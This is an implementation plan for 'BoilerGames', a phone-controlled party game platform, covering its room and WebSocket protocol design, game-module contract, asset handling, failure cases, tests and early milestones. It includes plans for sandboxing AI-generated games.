# BoilerGames: Implementation Plan (MVP lobby + extension structure)

> **Status (2026-10-16):** M0–M7 done; AI generation, frame games (§13, now `main`; the old block games are in the `block-games` branch), the catalogue (§14), bring-your-own-key (§15), game pages/votes/profiles (§16), a room per game (§17), the guided /create flow (§19) and better phones (§21) are built. **Focus (§22): the games that fit a big screen with phones as controllers** (drawing and guessing, writing and voting, bluffing and secrets, trivia, board games, loose real-time action), not platformers or RPGs. **Live at https://boilergames.party since 2026-10-17** (M8, §27–29). Next: play-tests with people. This file is the living plan: decisions and changes are recorded here as they happen, so `git log docs/PLAN.md` shows how it evolved.

_Site renamed from "LaunchPad Party" to **BoilerGames** on 2026-10-11 (built for the Purdue LaunchPad club; the club name stays where it refers to the club)._

## Context

We're building a Jackbox / Mario Party style party platform for Purdue LaunchPad. A host opens a big-screen page and gets a 4-letter room code. Players join from their phones with the code and a name. This plan covers:

- the lobby MVP
- a public homepage
- host-only accounts, stored in SQLite and added after the lobby works

It also sets up two seams so that games, and later AI-generated games, can plug in without a lobby rewrite:

- a game-module contract
- a single runner boundary

_When this plan was first written (2026-10-11) the project folder was empty; everything below was designed up front and then built milestone by milestone._

**Decisions you already made:**
- **Language:** plain JavaScript with JSDoc, not TypeScript.
- **Hosting:** a VPS or AWS eventually.
- **Host disconnect:** 30 seconds to reconnect.
- **Room size:** a global cap of 12, and each game can set a lower one.
- **Accounts:** only the host needs one. Players are guests.
- **Auth timing:** added after the lobby works.
- **Database:** better-sqlite3. No other auth dependencies: use `crypto.scrypt` and hand-rolled cookie sessions.
- **Game data:** games don't touch the database.

**Decisions locked in round 2 (2026-10-11):**
- **D5:** resume tokens live in `sessionStorage`.
- **D6:** players get a 30 s grace period in the lobby; in-game, their slot is kept until the game ends.
- **D7:** no late joiners. Spectators are a maybe for later.
- **D8:** the game contract is a ctx + callbacks object, option (a).
- **D12:** client routing is a hand-rolled pathname switch.
- **D13:** the database is better-sqlite3. Non-SQLite alternatives are noted in §9 for reference.
- **D17:** hosting is a single VPS.
- **D19:** the host kick button is included in M4.
- **D21:** inappropriate names are handled by host kick only.
- **Q1:** games use declarative view payloads (§4a).
- **Q2:** build a tiny playable demo game (new milestone M5b) plus an asset library (§4b).
- **Q3:** no email features.
- **Q4:** one room per host at a time (§6).
- **Q5:** the join URL and code are shown as text, with no QR code.

**Decisions locked in round 3 (2026-10-13), AI game generation (full design in §11):**
- **Build AI generation (milestones A0–A6) before deploying (M8).**
- **OpenShell sandboxes the agent that *writes* games.** Games at party time keep running exactly as they do now, in the server process with `GameRunner`.
- **Who can generate:** only the admin account (`alpingold`) for now. Later, any host who supplies their own Purdue GenAI Studio API key (A7, after checking RCAC's rules).
- **Model provider:** Purdue GenAI Studio (free for students, OpenAI-compatible API).
- **Where games live:** approved generated games are stored by the server (database), **not** in the repo. Only official, hand-made games live in the repo.
- **Contract:** option **C**, ctx + callbacks plus required `hostView()`/`playerView(id)`. No saving or resuming game progress in this version (it may come in a later iteration).

**Decisions locked in round 4 (2026-10-14), the game dev kit (full design in §12):**
- **Contract v3: composable block screens, input blocks and on-phone widgets**, all hand-written and trusted. Games still never run code in browsers; free HTML/JS is not built.
- **An AI dev kit first:** one kit reference ("the tools") feeds the AI prompt and a public `/kit` page. Games can be changed with follow-up prompts, and each change is a stored version.
- **No split between standalone games and minigames for now.** The Mario Party board with picked minigames is a later alternate mode, filterable in the catalogue.
- **Built before M8**, after A6.

**Dependencies:** react, react-dom, vite, @vitejs/plugin-react, express, ws, and better-sqlite3 (milestone 7). Nothing else unless you approve it. The tests use the built-in `node:test`.

---

## 1. Folder and file structure

```
practice/
  package.json              root scripts only: "dev:server", "dev:client", "test", "build" (uses npm --prefix, no extra deps)
  README.md                 how to run, plus the protocol summary (later)

  server/
    package.json            express, ws (later better-sqlite3); "type": "module"; scripts: start, dev (node --watch), test (node --test)
    src/
      index.js              Entry point: builds the Express app, the http.Server and the WS server, then listens. Wiring only, no logic.
      config.js             Every tunable constant in one place (limits, timeouts, ports). Easy to show your mentor.
      http/
        app.js              Express app: JSON body limit, /api/health, serves client/dist in production, mounts auth routes (M7)
        authRoutes.js       (M7) POST /api/signup, /api/login, /api/logout, GET /api/me
      transport/
        wsServer.js         WebSocket layer: upgrade handling (Origin check, M7 cookie auth), connection ids, heartbeat,
                            error handlers, rate limit. Turns raw frames into validated messages and passes them to the router.
        connection.js       Small Connection object: {id, ws, isAlive, userId, badMessageCount, rateLimiter}, plus send() that drops sends on closed sockets
        rateLimiter.js      (added M1) Token bucket with injectable clock
      protocol/
        messageTypes.js     The list of every client and server message type, as constants (one source of truth)
        validate.js         parseClientMessage(raw) → {ok:true, msg} | {ok:false, code}. Safe JSON.parse, shape and field checks per type.
        errors.js           Error code constants (ROOM_NOT_FOUND, NAME_TAKEN, …) with friendly messages
      server.js             (added M2) createGameServer(): builds http + ws + rooms without listening, so tests get a fresh full server
      router.js             Maps each validated message type to a RoomManager method. Enforces "who may send this" (host vs player vs none).
      rooms/
        RoomManager.js      Owns Map<code, Room>. Create/join/leave/resume/disconnect, grace timers, broadcasts. Has no ws import:
                            it is given send(connId, msg) and clock functions, so tests can fake them.
        Room.js             Data for one room plus pure helpers: addPlayer, removePlayer, toPublicState()
        roomCode.js         Makes 4-letter codes from a safe alphabet; retries on collision; takes an injectable RNG
        names.js            normalizeName() and validateName(): trim, NFC, collapse spaces, length, no control characters, case-insensitive key
        tokens.js           newToken(): crypto.randomBytes(16).toString('base64url'), plus isTokenShape()
      games/
        contract.js         JSDoc typedefs for GameModule / GameInstance / GameContext, plus validateGameModule(mod)
        registry.js         registerGame(mod), getGame(id), listGames(). Validates on register.
        index.js            The one place that imports game folders and registers them (registers reaction-race from M5b)
        views.js            (M5b) The list of allowed view kinds and a check function for each (§4a)
        reaction-race/
          index.js          (M5b) The tiny playable demo game (§4c)
        GameRunner.js       Wraps one running game: builds ctx, catches game exceptions, owns timers, checks outgoing payloads.
                            THIS is the sandbox seam (see §5).
      db/                   (M7)
        database.js         Opens better-sqlite3 and runs schema.sql on startup
        schema.sql          users and sessions tables
        users.js            createUser, findUserByUsername (prepared statements)
        sessions.js         createSession, getSessionUser, deleteSession, sweepExpired
      auth/                 (M7)
        passwords.js        hashPassword / verifyPassword with crypto.scrypt + timingSafeEqual
        cookies.js          parseCookies(header) (~10 lines) and serializeSessionCookie()
    test/
      unit/                 validate.test.js, names.test.js, roomCode.test.js, RoomManager.test.js, GameRunner.test.js, passwords.test.js
      integration/          lobby.test.js: real server on port 0 plus real `ws` clients
      fixtures/
        countGame.js        Tiny test-only game ("first to 3 taps wins") that proves the contract works. Never registered in production.
      helpers/fakeClock.js  Or use node:test's built-in mock.timers

  client/
    package.json            react, react-dom, vite, @vitejs/plugin-react
    vite.config.js          Dev proxy: /api and /ws → http://localhost:3000, so the browser sees one origin
    index.html
    src/
      main.jsx              Mounts <App/>
      App.jsx               Picks a page from window.location.pathname (/, /login, /host, /join). See decision D12.
      net/socket.js         One WebSocket wrapper: connect, auto-reconnect with backoff, JSON send, onMessage subscriptions, auto-resume using the stored token
      pages/Home.jsx        Public explainer plus "Host a game (log in)" and "Join a game" buttons
      pages/Login.jsx       (M7) Sign up / log in forms
      pages/Host.jsx        Big-screen view: room code, join URL, live PlayerList, Start button (disabled until games exist)
      pages/Join.jsx        Phone view: code and name form, then a "you're in" waiting screen
      components/PlayerList.jsx  Renders names as {name} text. NEVER dangerouslySetInnerHTML.
      game/GameScreen.jsx   (M5b) Shows the latest view payload by choosing the matching component
      game/views/           (M5b) MessageView, ButtonView, ChoiceView, CountdownView, ScoreboardView (one file each)
      assets.js             (M5b) Loads manifest.json once; assetUrl(id) returns the file path, or a placeholder for unknown ids
    public/assets/          (M5b) manifest.json + PNGs (your drawings / Blender renders)
      styles.css
```

**Why the layers are split this way:** `transport` knows about sockets but not about rooms. `rooms` knows about rooms but not about sockets. `games` sees only the narrow `ctx`. Because of this, `RoomManager` can be unit-tested with plain function calls, and the game sandbox can be swapped later by replacing only `GameRunner`.

---

## 2. Server data model and where state lives

All live game and room state is **in memory, in the server process**. The database (M7) stores **only accounts and login sessions**, never rooms. Rooms last minutes, and losing them on restart is acceptable.

```
RoomManager
  rooms: Map<code, Room>
  members: Map<connId, {code, role, playerId}>      // (M2 change) which room each connection is in; the ONLY copy of this
  // (M4 change) no token indexes: resume messages include the room code, and a room has at
  // most 12 players, so resume loops over them comparing tokens with timingSafeEqual.

Room
  code: "BXKT"
  phase: "lobby" | "in_game" | "closed"
  host: { token (secret), connId | null, userId (M7), graceTimer | null }
  players: Map<playerId, Player>       // Map keeps join order, so the list is stable
  maxPlayers: 12                       // global cap from config; a game may lower it at start
  game: GameRunner | null
  createdAt, lastActivityAt            // for the idle-room sweeper

Player
  id: "p_3f9a"        // PUBLIC id, broadcast to everyone, used in kick and game messages
  token: "…22 chars…" // SECRET, sent only to this player, used to resume after refresh
  name: "Alex"        // display name as typed (after normalization)
  nameKey: "alex"     // lowercase key, used for the uniqueness check
  connId | null       // null while disconnected
  connected: boolean
  graceTimer | null
  joinedAt
```

| State | Lives in | Why |
|---|---|---|
| Rooms, players, game state | `RoomManager` memory | Fast, simple, short-lived; the server is authoritative |
| Socket ↔ room/role mapping | `RoomManager.members` (changed in M2) | One copy of the truth, owned by the layer that owns rooms; transport only knows connection ids |
| Player/host resume token | Server memory **and** the client's `sessionStorage` | Lets a refresh reclaim the same slot |
| Accounts, login sessions (M7) | SQLite `users`, `sessions` | Must survive restarts |
| Login session id (M7) | httpOnly cookie `sid` | JavaScript can't read it, so XSS can't steal it |

**Two ids per player:** `playerId` is public and `token` is secret. If they were the same, anyone who saw the player list could impersonate someone. This is the most important data-model idea to explain to your mentor.

---

## 3. Message protocol

**Envelope:** every message is a JSON object `{ "type": "domain:action", ...fields }`. There's one flat object per message, with no nested `payload` except for game messages.

**Rules applied to every incoming frame (`validate.js` + `wsServer.js`), in order:**
1. **Payload size:** the WS server's `maxPayload` is 4 KB, so `ws` itself closes oversized frames with code 1009.
2. **Binary frames:** `isBinary === true` → reply `error BAD_MESSAGE`.
3. **Parsing:** `JSON.parse` runs inside try/catch. On failure → `BAD_MESSAGE`.
4. **Shape:** the result must be a plain object (not null, not an array) with `typeof type === 'string'` and a type from the client list. Otherwise → `UNKNOWN_TYPE`.
5. **Fields:** each type has a hand-written checker. Unknown extra fields are **ignored**: we copy out only the fields we expect, and never pass the raw object deeper.
6. **Bad message limit:** more than 10 invalid messages from one connection → close with 1008 (policy violation).
7. **Rate limit:** a token bucket per connection, about 20 messages per second with a burst of 40. Going over it → drop the message and send `RATE_LIMITED`. Repeated abuse → close.

**Field rules:**
- `code`: string. It is uppercased and trimmed, then must match `/^[A-Z]{4}$/`.
- `name`: string, at most 64 raw characters before normalization. Normalization trims, applies NFC, and collapses inner whitespace. The result must be 1–16 code points, with no `\p{C}` (control or invisible) characters. It must be unique within the room, compared case-insensitively against **all** players, including disconnected ones still in their grace period.
- `token` / `hostToken`: string matching `/^[A-Za-z0-9_-]{22}$/`.
- `playerId`: string matching `/^p_[a-z0-9]{4,12}$/`.
- `gameId`: string matching `/^[a-z0-9-]{1,40}$/`, and it must exist in the registry.
- `action` (game): a plain object. Its *contents* are validated by the game (§4), and its size is already capped by `maxPayload`.

### Client → server

| type | Who may send | Fields | Server behavior / errors |
|---|---|---|---|
| `host:create_room` | an unattached connection (M7: must have a logged-in `userId`) | — | Creates the room, marks this connection as host → `room:created`, `room:state`. **One room per host (Q4):** from M7 on, if this account already hosts a room, the server re-attaches to that room instead of creating a second one (see §6). Errors: `ALREADY_IN_ROOM`, (M7) `NOT_AUTHENTICATED`, `SERVER_FULL` (room-count cap) |
| `host:resume` | an unattached connection | `code`, `hostToken` | Re-attaches the host and cancels the grace timer → `room:created` (same payload) + `room:state`. Errors: `ROOM_NOT_FOUND`, `INVALID_TOKEN` |
| `player:join` | an unattached connection | `code`, `name` | → `room:joined` to this player, then `room:state` to everyone. Errors: `ROOM_NOT_FOUND`, `NAME_INVALID`, `NAME_TAKEN`, `ROOM_FULL`, `GAME_IN_PROGRESS`, `ALREADY_IN_ROOM` |
| `player:resume` | an unattached connection | `code`, `token` | Re-attaches to the existing player slot. If that slot already has a live socket, the old socket gets `room:closed {reason:"replaced"}` and is closed (handles a second tab). Errors: `ROOM_NOT_FOUND`, `SESSION_EXPIRED` |
| `room:leave` | host or player | — | Player: removed now. Host: room closes now (this is the explicit "End room" button, which is different from a disconnect) |
| `host:kick` | host | `playerId` | Removes the player and sends them `room:closed {reason:"kicked"}`. Error: `PLAYER_NOT_FOUND`. *(Optional for MVP, see D19)* |
| `host:start_game` | host, phase `lobby` | `gameId`, `options?` (plain object) | See §4. Errors: `GAME_NOT_FOUND`, `WRONG_PLAYER_COUNT`, `WRONG_PHASE` |
| `game:action` | player (in-game) | `action` (plain object) | Forwarded to `GameRunner.handleAction(playerId, action)`. Error: `WRONG_PHASE` |

There's no app-level `ping`. Heartbeats use WebSocket protocol pings, which browsers answer automatically.

### Server → client

| type | Sent to | Fields |
|---|---|---|
| `room:created` | host | `code`, `hostToken` |
| `room:joined` | the joining or resuming player | `code`, `playerId`, `token`, `name` |
| `room:state` | everyone in the room, on every change | `code`, `phase`, `hostConnected`, `maxPlayers`, `players: [{id, name, connected}]`, `gameId \| null` |
| `room:closed` | everyone affected | `reason`: `"host_left"`, `"host_timeout"`, `"kicked"`, `"replaced"`, `"idle"`, `"left"` (added M4: confirms a player's own room:leave). The socket stays open after this, so the same page can join or create another room |
| `error` | the sender | `code` (constant), `message` (human text), `requestType` (the type that failed, if known) |
| `game:started` | everyone | `gameId`, `players: [{id, name}]` |
| `game:message` | the targets the game chose | `payload` (a view payload, see §4a), `serverNow` (ms, used for clock-offset correction) |
| `game:ended` | everyone | `results` (`{ rankings: [playerId,…] }` or `{ error: true }`) |

**Why send full `room:state` snapshots instead of deltas:** with at most 12 players a snapshot is tiny. A client that missed a message, for example after a reconnect, simply gets the truth on the next message. Delta updates create sync bugs we don't need. The `ctx.broadcast` payloads for games follow the same idea (see §4).

---

## 4. Game module contract, registry, and starting a game

### Contract (`server/src/games/contract.js`, written as JSDoc)

> **Superseded by contract v2 (§11b, built in A1).** v2 adds `contractVersion: 2`, `ctx.now()`, optional `scores` in `endGame`, automatic resend of each screen's latest view on reconnect, and the offered-actions check. The code in `contract.js` is the source of truth.

```js
/**
 * A GameModule is a plain object exported by a game folder.
 * @typedef {Object} GameModule
 * @property {string} id            // "mario-board", matches /^[a-z0-9-]{1,40}$/
 * @property {string} name          // display name
 * @property {string} description
 * @property {number} minPlayers    // >= 1
 * @property {number} maxPlayers    // <= config.MAX_PLAYERS (12)
 * @property {(ctx: GameContext, options: object) => GameInstance} createGame
 */

/**
 * What the platform gives a game. This is the ONLY way a game talks to the world.
 * Everything passed in or out must be plain JSON (no functions, classes, Dates),
 * so the same contract can later cross a process/worker boundary unchanged.
 * @typedef {Object} GameContext
 * @property {ReadonlyArray<{id:string, name:string}>} players  // frozen snapshot at start
 * @property {(payload: object) => void} broadcast              // to host screen + all players
 * @property {(playerId: string, payload: object) => void} sendToPlayer
 * @property {(payload: object) => void} sendToHost             // big-screen-only info
 * @property {(fn: () => void, ms: number) => number} setTimeout // runner-owned; auto-cleared on end
 * @property {(id: number) => void} clearTimeout
 * @property {() => number} random                              // seeded PRNG [0,1); deterministic in tests
 * @property {(results: {rankings: string[]}) => void} endGame  // game is over; runner disposes it
 * @property {(msg: string) => void} log
 */

/**
 * What a game gives back from createGame().
 * @typedef {Object} GameInstance
 * @property {(playerId: string, action: object) => void} onAction       // REQUIRED. Game must validate `action` itself.
 * @property {(playerId: string) => void} [onPlayerDisconnect]
 * @property {(playerId: string) => void} [onPlayerReconnect]           // good moment to resend that player's view
 * @property {() => void} [onHostReconnect]                              // (added M5) resend the big screen's view
 * @property {() => void} [dispose]                                      // cleanup; runner calls it once
 */
```

**Rules for games (written in the doc comment, enforced by GameRunner where possible):**
- A game never imports platform modules, sockets, `fs`, the network, or the database. It only uses `ctx`.
- All randomness comes from `ctx.random` and all timing from `ctx.setTimeout`. This keeps games testable and lets the runner clean up.
- Every outgoing payload must be a JSON-serializable plain object under 8 KB. The runner checks this with `JSON.stringify` and a length check, and throws inside the game if it fails.
- The game treats `action` as untrusted. It validates the action against the current game state, and rejects anything like a move out of turn.
- (Added M5) Synchronous code only: no async/Promises/global timers. The runner can only catch errors thrown while it is calling the game.
- (Added M5) Every message must be a valid view (§4a); view checks are strict (unknown fields are errors).
- (Added M5) The registry is a `GameRegistry` class (so tests get isolated registries); `createDefaultRegistry()` in `games/index.js` lists the real games; `GET /api/games` serves `list()` to the host's picker.
- (Added M5) A game starts with every player in the room, including ones in their lobby grace period; their timers stop, and they get a fresh grace period when the game ends.

### GameRunner (`server/src/games/GameRunner.js`)
- Takes `(module, room, sendFns, clock, seed)`. It builds `ctx` and calls `module.createGame(ctx, options)` inside try/catch.
- Every call into the game (`onAction`, timer callbacks, disconnect hooks) is wrapped in try/catch. If the game throws, the runner logs it, ends the game with `{error:true}`, and returns the room to the lobby. **A buggy game must never crash the server or the room.**
- It keeps a set of active timers, and `dispose()` clears them all, so timers can't leak after a game ends.
- It translates `ctx.broadcast(p)` into `game:message {payload:p}` for every connected player and the host.

### Registry (`server/src/games/registry.js`)
- `registerGame(mod)` runs `validateGameModule(mod)`, which checks the id format, the types, `1 ≤ minPlayers ≤ maxPlayers ≤ 12`, that `createGame` is a function, and that the id is not a duplicate. If any check fails it throws at startup, so a bad game can't be half-registered.
- `games/index.js` statically imports each game folder and registers it. It's empty in the MVP. Tests register `fixtures/countGame.js` directly.
- `listGames()` returns `{id, name, description, minPlayers, maxPlayers}` so the host UI can show a picker later.

### Starting a game from a room (`host:start_game`)
1. The router checks that the sender is this room's host.
2. `RoomManager.startGame(code, gameId, options)` checks that the phase is `lobby`, that the game exists, and that the count of **connected** players is between the game's `minPlayers` and `maxPlayers`.
3. The room sets `phase = "in_game"` and creates `room.game = new GameRunner(...)`, then broadcasts `game:started` and `room:state`.
4. During the game, `game:action` goes to the runner. Lobby messages still work: `room:leave` calls `onPlayerDisconnect`, and joins are refused with `GAME_IN_PROGRESS`.
5. When the game calls `ctx.endGame(results)`, or the game crashes, the runner is disposed and the room goes back to `phase = "lobby"`. The room broadcasts `game:ended`, then `room:state`, and the host can start again.

### 4a. Declarative views (decided, Q1)

Games never send UI code. Instead they send **view payloads**: plain JSON that names one of a small set of view kinds. The client has one trusted React component per kind and renders the payload with it.

- **Phones:** a game sends a view with `ctx.sendToPlayer(id, {view, ...})`, or to every player with `ctx.broadcast(...)`.
- **Big screen:** a game sends a host view with `ctx.sendToHost({view, ...})`.
- **Latest view wins:** each new view replaces the previous one on that screen. This is the same snapshot idea as `room:state`, so a reconnecting phone only needs its latest view, and the game resends it in `onPlayerReconnect`.

**Starting view kinds.** Start with these and add more only when a real game needs them:

| `view` | Fields | Phone renders | Host renders |
|---|---|---|---|
| `message` | `title`, `text?`, `asset?` | Big text with an optional image | Same, but larger |
| `button` | `label`, `action` (object sent back unchanged), `asset?` | One big tappable button. A tap sends `game:action {action}` | n/a |
| `choice` | `prompt`, `options: [{label, action, asset?}]` (max 8) | A list of buttons | n/a |
| `countdown` | `title`, `endsAt` (server ms timestamp) | Number counting down | Same |
| `scoreboard` | `title`, `rows: [{playerId, score}]` | Highlights your own row | Full table, with names looked up from `room:state` |

**Rules for view payloads:**
- **Validation.** The **client** checks each view against its kind. An unknown kind or bad fields render as a neutral "Waiting…" screen, never a crash. The **server**'s GameRunner also checks that `view` is a known kind before sending, so a game finds its bug in tests rather than on someone's phone.
- **Rendering text.** All text is rendered as React text, so a game can't inject HTML.
- **Images.** The `asset` field is an **asset id** from the library (§4b), never a URL. This means a game, AI-generated or not, can only display art you approved.
- **Timing.** `endsAt` uses server time. The server sends its current time (`serverNow`) in `game:message`, so each client can correct for its own clock being off.

**Where the files go:**
- `client/src/game/GameScreen.jsx` picks the right view component.
- `client/src/game/views/*.jsx` holds one file per view kind.
- `server/src/games/views.js` holds the server-side list of view kinds and their check functions. It is shared in spirit with the client's checks; the two copies are kept in sync manually for now.

### 4b. Asset library (from Q2)

**Making art:**
- **Hand drawings:** scan or draw them, then export to PNG.
- **Blender:** render to PNG sprites with transparent backgrounds. A Blender render is just an image file, so no new dependency is needed.
- **Real-time 3D:** showing live 3D models (glTF) in the browser would need three.js, a new dependency. Defer that, and ask first if you want it.

**Where art lives:**
- **Files:** `client/public/game-assets/<file>` (changed in M5b from `assets/`, which Vite uses for its own build output), served as static files. SVG and PNG both work; placeholders are hand-written SVGs.
- **Manifest:** `client/public/assets/manifest.json` lists every approved asset: `[{id, file, tags:["character","board"], width, height, credit}]`. Asset ids match `/^[a-z0-9-]{1,40}$/`.

**How games use art:**
- **At runtime:** games refer to art only by asset id. The client looks the id up in the manifest, and an unknown id shows a placeholder.
- **AI-generated games:** the manifest becomes part of the generation prompt, as the list of usable art and its tags. Generated games can only reference existing ids. Making new art with AI is a separate, later decision.
- **Tests:** the asset-id check is part of the E4 test harness. A game that references an unknown asset id fails the test.

### 4c. Demo game (from Q2): "Reaction Race"

This tiny game exists to prove the whole path works end to end on real phones: contract, registry, views, timers and assets. It lives at `server/src/games/reaction-race/index.js` and is registered in `games/index.js`.

- **Players:** 1–12.
- **Rounds:** 5 rounds. In each round:
  - The host screen shows "Get ready…".
  - After a random 2–5 s delay (from `ctx.random`, scheduled with `ctx.setTimeout`), everyone sees **GO!** and phones show a `button` view.
  - The first valid tap wins the round.
  - A tap *before* GO is ignored, and the phone shows "Too soon!".
- **Ending:** after 5 rounds the game shows a `scoreboard` and calls `endGame({rankings})`.
- **Timing fairness:** the winner is decided by **server arrival order**. That is simple and explainable. Different phone latencies are a known limitation (§10).
- **Art:** it uses 1–2 placeholder assets (e.g. `go-sign`, `trophy`) so the asset path is exercised. Your own art can replace them later.
- **Tests:** `server/test/unit/reactionRace.test.js` uses mock timers and a seeded RNG. It covers a full 5-round game, tapping too early, a player disconnecting mid-round, and that every outgoing view is valid.

**Minigames:** the board game is one `GameModule`. Each minigame should use **the exact same contract**: it gets a `ctx`, exchanges JSON, and calls `endGame(results)`. Later the board game gets one extra ctx function, `ctx.runMinigame(minigameId) → Promise<results>`. That function looks the minigame up in a separate minigame registry and runs it in a child `GameRunner`. This is not built now, but keeping one contract means AI-generated minigames have one target.

---

## 5. Extension points for AI-generated games and sandboxing

> **Update 2026-10-13:** the concrete design is now §11, and it supersedes parts of this section.
> - **E2 (runtime sandbox): not built for now.** Generated games run in-process like official ones. The protection comes from testing them inside OpenShell plus admin review before they ever run on the server (see the §11 risks).
> - **E3:** becomes the `source`/`status` fields on registered games.
> - **E4:** becomes the harness (A2).

| # | Extension point | Where | What plugs in later |
|---|---|---|---|
| E1 | **Contract** | `games/contract.js` | The JSDoc typedefs become the spec in the AI prompt. `validateGameModule` is the first automatic check on generated code. |
| E2 | **Runner boundary** | `games/GameRunner.js` | A `SandboxedGameRunner` with the same public methods (`handleAction`, `playerDisconnected`, `dispose`). It runs the game code in a separate process or isolate and forwards `ctx` calls as JSON messages. Room code doesn't change, because rooms only call the runner. This works because the contract is JSON-only. |
| E3 | **Registry source** | `games/registry.js` | `registerGame(mod, {trusted:false, source})`. Untrusted games are always created with `SandboxedGameRunner`. Generated games could be loaded from a folder or from the DB instead of static imports. |
| E4 | **Test harness** | `test/helpers` (a simulated-players driver) | The same harness that tests `countGame` becomes the automatic gate for generated games: run N random games, assert they call `endGame`, never throw, and stay within message and size limits. |
| E5 | **Resource limits** | runner config | Timeouts on each call into the game, a cap on how fast a game can send messages, the payload cap (already present), and later memory and CPU caps for the sandbox. |
| E6 | **View kinds** | `server/src/games/views.js` + `client/src/game/views/` | **Decided (§4a).** Generated games only emit view payloads, and no generated UI code ever runs in a browser. A new view kind is a reviewed, hand-written addition: a trusted component plus a validator. AI can propose new kinds but can't ship them. |
| E7 | **Asset library** | `client/public/assets/manifest.json` | Generated games reference art by asset id only. The manifest (ids and tags) is given to the generator as the art that may be used. AI-generated art, if ever wanted, would go through the same manifest after human approval. |

**Sandbox technology, decided later and noted honestly:**
- `node:vm` is **not** a security boundary. Don't use it for untrusted code.
- `worker_threads` gives you memory limits and termination, but code inside still has full Node APIs.
- Real options:
  - a child process using Node's permission model (`--permission`)
  - the `isolated-vm` package (a new dependency)
  - a container per game

Plan for E2 to be one of these. Pick when you get there.

**Generation pipeline (future):** prompt plus contract, view kinds and asset manifest → generated code → static checks → `validateGameModule` → simulated-player harness (E4) → **human approval** → register as untrusted (E3).

---

## 6. Failure cases

| Case | Handling |
|---|---|
| **Host disconnect** (socket closes or heartbeat fails) | Set `host.connId = null` and broadcast `room:state {hostConnected:false}` so phones show "waiting for host…". Start a **30 s** timer. `host:resume` with a valid `hostToken` cancels it. If it expires, send `room:closed {reason:"host_timeout"}` to everyone, clear all player timers, dispose the game, and delete the room and its index entries. |
| **Host clicks "End room"** | `room:leave` from the host closes the room immediately with `reason:"host_left"`. |
| **Host opens a second room (Q4)** | Before M7, one room per *connection* (`ALREADY_IN_ROOM`). From M7 on, `Room.host.userId` is indexed in `hostByUser: Map<userId, code>`. If a logged-in host sends `host:create_room` while their room is alive, the server **re-attaches** them to it: the old host socket gets `room:closed {reason:"replaced"}`, and the new tab is the host. To get a fresh room they press "End room" first. **Why re-attach instead of an error:** a host who opens a new tab or switches laptops mid-party keeps the room, and nobody's phone gets kicked. |
| **Host refreshes the page** | The client keeps `{code, hostToken}` in `sessionStorage`. On load, `socket.js` sends `host:resume`, so the room survives and the same code still works. |
| **Player refresh / phone sleep** | On close: set `connected=false` and broadcast. The slot is kept for **30 s in the lobby** and **until the game ends while in-game** (D6). The client stores `{code, token}` in `sessionStorage` and sends `player:resume` automatically. If the slot is gone → `SESSION_EXPIRED`, and the client shows the join form with the code prefilled. |
| **Same player in two tabs** | A resume on an already-attached slot: the newest connection wins, and the old one gets `room:closed {reason:"replaced"}` and is closed. |
| **Duplicate name** | Compare the normalized lowercase `nameKey` against every player, including those still in their grace period → `NAME_TAKEN`. The client keeps the form open. |
| **Full room** | Count all players, including disconnected ones in grace: if `>= room.maxPlayers` → `ROOM_FULL`. |
| **Join during a game** | `GAME_IN_PROGRESS`. Resuming an existing slot is still allowed. |
| **Wrong or unknown code** | `ROOM_NOT_FOUND`. Join attempts per connection are rate-limited, so the ~130k possible codes can't be quickly guessed. |
| **Malformed message** (bad JSON, unknown type, bad fields, binary) | Reply `error`, keep the socket open, and count it. More than 10 → close 1008. Too large → `ws` closes with 1009 by itself. |
| **Exception in our own handler** | `router.js` wraps every dispatch in try/catch, logs the error, and replies `INTERNAL_ERROR`. The process keeps running. |
| **Socket `error` event** | Every `ws` gets `ws.on('error', log)`. An unhandled `'error'` event **crashes Node**, so this handler is required. |
| **Dead connections** | Every 15 s: if `isAlive` is false → `ws.terminate()`. Otherwise set `isAlive=false` and `ws.ping()`, and `'pong'` sets it back to true. Terminating triggers the normal disconnect path above. Clear the interval on server close. |
| **Game throws** | The GameRunner catches it → `game:ended {error:true}` and the room goes back to the lobby (§4). |
| **Abandoned rooms** | A sweeper every 5 minutes closes rooms idle for more than 2 h, or with no host and no players. |
| **Server restart** | All rooms are lost (accepted for now). Clients see the socket close, retry, get `ROOM_NOT_FOUND` on resume, and show "Room ended". |
| **Cross-site WebSocket hijack** (M7, once cookies matter) | On `upgrade`, reject if the `Origin` header isn't in the allowed list. |

---

## 7. Testing approach (node:test, no new dependencies)

- **Pure unit tests:**
  - `validate.test.js`: a table of bad inputs (`"not json"`, `null`, `[]`, `{type:5}`, a long name, a name with `\u0000`, lowercase code, extra fields, …) → the expected error code.
  - `names.test.js`: normalization and the case-insensitive key.
  - `roomCode.test.js`: with a seeded RNG, codes use the alphabet, and collisions retry.
- **`RoomManager.test.js` (most important):** build a `RoomManager` with a fake `send` that records `{connId, msg}` into an array, and use `node:test`'s `mock.timers`. Cover:
  - create → join → everyone gets the right `room:state`
  - duplicate name, full room at 12, join during a game
  - player disconnect → resume within 30 s keeps the slot; after 30 s the slot is removed
  - host disconnect → after 29 s still open, after 30 s closed and everyone gets `room:closed`
  - two-tab replacement
  - no timers left running after a room closes (a leak check)
- **`GameRunner.test.js` with `fixtures/countGame.js`:**
  - actions route to the game
  - `endGame` returns the room to the lobby
  - a game that throws doesn't throw out of the runner
  - timers are cleared on dispose
  - oversized or non-JSON payloads are rejected
- **Integration (`lobby.test.js`):** start the real server on port 0 and connect 3 real `ws` clients:
  - full join flow
  - send garbage, then check the server still answers others
  - send 5 KB and check the socket is closed with 1009
  - kill a client without closing and check it's dropped (use a short heartbeat via config override)
- **M7:**
  - auth uses `new Database(':memory:')`
  - password hash/verify round-trip and wrong-password tests
  - signup → login → `/api/me` with Node's built-in `fetch`
  - `host:create_room` without a cookie → `NOT_AUTHENTICATED`
- **Manual checklist per milestone:** a laptop plus 2 phones on the same Wi-Fi.

**Why most logic lives in `RoomManager` without sockets:** almost everything can be tested in milliseconds with no network. This is the payoff of the layer split.

---

## 8. Build order (each milestone is runnable and reviewable)

| M | Goal | You can run / review |
|---|---|---|
| **M0 Scaffold** | Root + `server/` + `client/` packages, Express `/api/health`, Vite app, dev proxy | `npm run dev:server` + `dev:client`; the page loads and fetches `/api/health` |
| **M1 Transport** | `wsServer.js`, `connection.js`, `validate.js`, `errors.js`, heartbeat, error handlers, rate limit, a temporary echo handler | Connect from browser devtools; send garbage and see error replies; the server survives. `validate.test.js` passes |
| **M2 Rooms: create** | `RoomManager`, `Room`, `roomCode`, `tokens`, `router.js`, `host:create_room`; `Host.jsx` shows the code | The host page shows a code. Unit tests for creation |
